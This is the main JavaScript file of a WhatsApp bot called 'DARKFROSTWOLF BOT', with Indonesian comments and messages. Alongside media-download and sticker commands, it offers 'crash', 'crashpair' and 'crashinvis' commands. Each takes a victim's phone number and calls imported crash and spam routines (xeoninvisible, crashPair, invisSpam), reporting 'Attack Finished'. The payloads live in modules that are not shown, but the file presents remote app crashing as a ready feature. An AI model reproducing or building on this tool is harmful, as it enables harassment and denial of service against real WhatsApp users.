// index.js - FIXED BROWSER ERROR
const { default: makeWASocket, useMultiFileAuthState, DisconnectReason, Browsers, delay } = require('@whiskeysockets/baileys');
const qrcode = require('qrcode-terminal');
const pino = require('pino');
const config = require('./config.js');
const readline = require('readline');
const chalk = require('chalk');

// Imports
const { downloadVideo } = require('./lib/ytdl.js');
const { makeQuote } = require('./lib/qc.js');
const { xeoninvisible } = require('./lib/crash.js');
const { showMenu } = require('./handler/menu.js');
const { spamMassal, crashPair } = require('./lib/attack.js'); 
const { invisSpam } = require('./lib/fcinvis.js'); // Import invisSpam dari
let sock = null;
let rl = null;

async function askPhoneNumber() {
  if (!rl) rl = readline.createInterface({ input: process.stdin, output: process.stdout });
  const question = (text) => new Promise((resolve) => rl.question(text, resolve));
  console.log(chalk.red.bold('\n╔════════════════════════════════════════╗'));
  console.log(chalk.red.bold('║   🚀 DARKFROSTWOLF BOT - ULTIMATE v6   ║'));
  console.log(chalk.red.bold('╚════════════════════════════════════════╝'));
  return await question(chalk.yellow('\n📱 Masukkan Nomor Bot (62xxx): '));
}

async function connectToWhatsApp() {
  const { state, saveCreds } = await useMultiFileAuthState(config.sessionName);
  
  const socketConfig = {
    auth: state,
    logger: pino({ level: 'silent' }),
    // --- PERBAIKAN DI SINI ---
    browser: ["Ubuntu", "Chrome", "20.0.04"], 
    // ------------------------
    markOnlineOnConnect: true,
    printQRInTerminal: false,
  };
  
  if (config.connectionMethod === 'pairing' && !state.creds.registered) {
    const phoneNumber = await askPhoneNumber();
    sock = makeWASocket(socketConfig);
    setTimeout(async () => {
        try {
            let code = await sock.requestPairingCode(phoneNumber);
            code = code?.match(/.{1,4}/g)?.join("-") || code;
            console.log(chalk.greenBright.bold(`\n🔑 KODE PAIRING: ${code}\n`));
        } catch (err) { console.log(chalk.red('❌ Gagal request kode.')); }
    }, 3000);
  } else {
    sock = makeWASocket(socketConfig);
  }

  sock.ev.on('creds.update', saveCreds);
  
  sock.ev.on('connection.update', async (update) => {
    const { connection, lastDisconnect, qr } = update;
    if (qr && config.connectionMethod === 'qr') qrcode.generate(qr, { small: true });
    
    if (connection === 'open') console.log(chalk.green('\n✅ BOT SIAP! (Fix Browser Error)'));
    
    if (connection === 'close') {
      const reason = lastDisconnect.error?.output?.statusCode;
      if (reason === DisconnectReason.loggedOut) {
          process.exit(1);
      } else { connectToWhatsApp(); }
    }
  });
  
  sock.ev.on('messages.upsert', async (m) => {
    try {
        const msg = m.messages[0];
        if (!msg.message) return;

        const text = msg.message.conversation || 
                     msg.message.extendedTextMessage?.text || 
                     msg.message.imageMessage?.caption || '';
        
        if (!text.startsWith(config.botPrefix)) return;

        const chatId = msg.key.remoteJid;
        const isGroup = chatId.endsWith('@g.us');
        const sender = isGroup ? (msg.key.participant || chatId) : chatId;
        const senderNumber = sender.split('@')[0].split(':')[0].replace(/\D/g, '');
        const botNumber = sock.user.id.split(':')[0] + '@s.whatsapp.net';

        const command = text.slice(config.botPrefix.length).trim().split(' ')[0].toLowerCase();
        const args = text.slice(config.botPrefix.length + command.length).trim().split(' ');
        const pushname = msg.pushName || 'User';

        console.log(chalk.cyan(`📨 ${command} | ${senderNumber}`));

        const reply = (teks) => sock.sendMessage(chatId, { text: teks }, { quoted: msg });

        // === COMMANDS ===

        if (command === 'menu') {
            await showMenu(sock, chatId, pushname);
        }

        // 1. PLAY / AUDIO
        else if (command === 'play' || command === 'mp3') {
            if (!args[0]) return reply(`Masukkan Link!\nContoh: ${config.botPrefix}play https://youtu.be/xxx`);
            await reply('⏳ Downloading Audio (Buffer)...');
            try {
                const buffer = await downloadVideo(args[0], 'audio');
                await sock.sendMessage(chatId, { 
                    audio: buffer, 
                    mimetype: 'audio/mp4', 
                    ptt: false 
                }, { quoted: msg });
            } catch (err) {
                await reply(`❌ Error: ${err.message}`);
            }
        }

        // 2. VIDEO / MP4
        else if (command === 'video' || command === 'mp4') {
            if (!args[0]) return reply(`Masukkan Link!\nContoh: ${config.botPrefix}video https://youtu.be/xxx`);
            await reply('⏳ Downloading Video (Buffer)...');
            try {
                const buffer = await downloadVideo(args[0], 'video');
                await sock.sendMessage(chatId, { 
                    video: buffer, 
                    caption: '🎥 Video Success' 
                }, { quoted: msg });
            } catch (err) {
                await reply(`❌ Error: ${err.message}`);
            }
        }

        // 3. CRASH PAIRING
        else if (command === 'crashpair' || command === 'cp') {
            if (!args[0]) return reply(`Format: ${config.botPrefix}cp 628xxx`);
            const target = args[0].replace(/\D/g, '');
            
            await reply(`☠️ Mengirim Pairing Crash ke ${target}...`);
            await crashPair(target);
            await reply(`✅ Attack Finished.`);
        }

        // 4. CRASH BIASA
        else if (command === 'crash') {
            if (!args[0]) return reply(`Format: ${config.botPrefix}crash 628xxx`);
            const target = args[0].replace(/\D/g, '');
            await reply(`☠️ MENGIRIM BUG...`);
            await xeoninvisible(sock, target);
            await delay(2000);
            await xeoninvisible(sock, target);
            await reply(`✅ Done.`);
        }
          
        // 3. CRASH INVIS (Moved to separate file)
        else if (command === 'crashinvis') {
            if (!args[0]) return reply(`Format: ${config.botPrefix}crashinvis 628xxx`);
            const target = args[0].replace(/\D/g, '');
            
            await reply(`☢️ MENGIRIM INVIS CRASH KE ${target}...`);
            await invisSpam(sock, target);
            await reply(`✅ Attack Finished.`);
        }

        // 5. QC
        else if (command === 'qc') {
             if (!args[0]) return reply('Teksnya mana?');
             try {
                const sticker = await makeQuote(sock, msg, args.join(' '), pushname, sender);
                await sock.sendMessage(chatId, { sticker }, { quoted: msg });
             } catch (e) { reply('Gagal buat sticker'); }
        }

        // 6. OWNER
        else if (command === 'owner') {
            const vcard = 'BEGIN:VCARD\nVERSION:3.0\n' + 
                          `FN:${config.ownerName}\n` + 
                          `TEL;type=CELL;waid=${config.ownerNumber}:${config.ownerNumber}\n` + 
                          'END:VCARD';
            await sock.sendMessage(chatId, { contacts: { displayName: config.ownerName, contacts: [{ vcard }] } });
        }

        // FITUR GRUP
        else if (['kick', 'add', 'promote', 'demote', 'tagall', 'hidetag'].includes(command)) {
             if (!isGroup) return reply('Khusus grup!');
             reply('Fitur grup aktif.'); 
        }

    } catch (error) {
        console.error('Handler Error:', error);
    }
  });
  
  return sock;
}

connectToWhatsApp();
